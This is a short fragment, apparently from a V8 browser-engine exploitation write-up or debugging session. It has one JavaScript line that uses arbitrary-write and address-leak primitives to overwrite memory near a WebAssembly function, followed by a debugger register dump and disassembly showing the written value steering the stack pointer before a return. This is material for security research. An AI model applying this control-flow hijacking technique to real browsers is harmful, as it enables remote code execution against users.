

```js
v8_write64(addrOf(instance.exports.func1)-0x30+0x18,0x4141n);
// ============================================================
RAX  0x0
*RBX  0x23dc00000069 ◂— 0x4
*RCX  0x4142
*RDX  0x23dc000202d5 ◂— 0x77ef608402000003
*RDI  0x23dc002dcdb5 ◂— 0xfe0040640000000d /* '\r' */
*RSI  0x9d
*R8   0x4141
*R9   0x32bb00000755 ◂— 0xfc00400200000009 /* '\t' */
*R10  0x7fff7f4c9309 ◂— mov r12, qword ptr [rbp - 0x20]
*R11  0x7fffffffd4f0 ◂— 0x0
*R12  0x7ffff20c1cc0 ◂— 0x0
 R13  0x5555555fd080 —▸ 0x7fff7f482400 ◂— push rbp
*R14  0x23dc00000000 ◂— 0x40940
*R15  0x23dc00000725 ◂— 0xe500000000000005
*RBP  0x7fffffffd660 —▸ 0x7fffffffd688 —▸ 0x7fffffffd700 —▸ 0x7fffffffd890 —▸ 0x7fffffffd920 ◂— ...
*RSP  0x80000001dff0
*RIP  0x7fff7fda5941 ◂— push r10
/// ======================

   0x7fff7fda5931:	mov    eax,DWORD PTR [rbp-0xe8]
   0x7fff7fda5937:	mov    rsp,rbp
   0x7fff7fda593a:	pop    rbp
   0x7fff7fda593b:	pop    r10
   0x7fff7fda593d:	lea    rsp,[rsp+rcx*8]
=> 0x7fff7fda5941:	push   r10
   0x7fff7fda5943:	ret  


```